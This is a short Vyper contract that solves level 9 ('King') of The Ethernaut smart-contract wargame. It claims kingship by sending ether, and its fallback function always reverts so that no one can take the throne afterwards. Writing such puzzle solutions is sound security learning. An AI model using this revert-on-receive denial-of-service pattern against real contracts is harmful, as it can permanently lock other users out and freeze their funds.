# pragma version 0.4.0
"""
@title A hack for level 9 (King) of The Ethernaut
@license MIT
@author unluckyduke7
"""

@payable
@external
def __default__():
	raw_revert(b"")


@payable
@external
def hack(instance: address):
	raw_call(instance, b"", value=msg.value)	
